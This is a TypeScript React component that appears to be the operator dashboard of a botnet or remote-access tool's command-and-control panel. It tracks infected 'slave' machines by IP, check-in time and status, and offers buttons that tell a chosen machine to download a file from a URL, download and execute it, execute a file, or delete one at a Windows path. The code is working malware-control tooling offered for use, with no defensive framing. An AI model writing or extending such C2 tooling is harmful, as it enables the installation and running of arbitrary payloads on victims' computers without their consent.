import { useEffect, useState } from "react";
import Link from "next/link";

interface SlaveData {
  freq: number;
  slaveIP: string;
  slaveLastCheckin: string;
  slaveName: string;
  slavePing: string;
  slaveStatus: string;
}




export default function DownloadManager({ slave }: { slave: SlaveData }) {
    const [downloadURL, setDownloadURL] = useState<string>(""); // ✅ Ensures initial value is always a string
    const [downloadPath, setDownloadPath] = useState<string>("");
  
    const sendCommand = async (slaveName: string, commandText: string) => {
        try {
          const response = await fetch("/api/send-command", {
            method: "POST",
            headers: {
              "Content-Type": "application/json",
            },
            body: JSON.stringify({
              slaveName, // ✅ Correctly formatted slave name
              command_text: commandText, // ✅ Correctly formatted command
            }),
          });
      
          const data = await response.json();
          console.log("API Response:", data);
          return data;
        } catch (error) {
          console.error("Error sending command:", error);
        }
      };
      
      const handleSendCommand = (command: string) => {
        if (!downloadURL || !downloadPath) {
          alert("Please enter a valid download URL and path.");
          return;
        }
      
        const fullCommand = `${command},${downloadURL},${downloadPath}`; // ✅ Correct command format
        sendCommand(slave.slaveName, fullCommand);
      
        
      };
      
  
    return (
      <div className="w-full rounded-lg">
        <h1 className="text-xl font-bold mb-2">Download Manager</h1>
  
        <div className="grid grid-cols-2 gap-4 md:gap-x-6 basis-full items-center">
          
          {/* ✅ Input Fields: Store values in state */}
          <div className="flex flex-col gap-2">
            <input
              type="url"
              value={downloadURL}
              onChange={(e) => setDownloadURL(e.target.value)}
              className="bg-neutral-900 border border-lime-500 text-lime-500 text-sm rounded-lg block w-full p-2.5"
              placeholder="http://download.com/file.exe"
            />
            <input
              type="text"
              value={downloadPath}
              onChange={(e) => setDownloadPath(e.target.value)}
              className="bg-neutral-900 border border-lime-500 text-lime-500 text-sm rounded-lg block w-full p-2.5"
              placeholder="C:/Users/Public/Documents/example.exe"
            />
          </div>
  
          {/* ✅ Buttons: Send commands with input values */}
          <div className="grid grid-cols-2 gap-2">
            <button
              onClick={() => handleSendCommand("dl_only")}
              className="bg-black border-2 border-lime-500 text-sm text-lime-500 outline outline-1 rounded-lg w-full p-3"
            >
              Download
            </button>
            <button
              onClick={() => handleSendCommand("dl_exec")}
              className="bg-black border-2 border-lime-500 text-sm text-lime-500 outline outline-1 rounded-lg w-full p-3"
            >
              Download & Execute
            </button>
            <button
              onClick={() => handleSendCommand("exec_only")}
              className="bg-black border-2 border-lime-500 text-sm text-lime-500 outline outline-1 rounded-lg w-full p-3"
            >
              Execute File
            </button>
            <button
              onClick={() => handleSendCommand("delete")}
              className="bg-black border-2 border-lime-500 text-sm text-lime-500 outline outline-1 rounded-lg w-full p-3"
            >
              Delete File
            </button>
          </div>
  
        </div>
      </div>
    );
  }
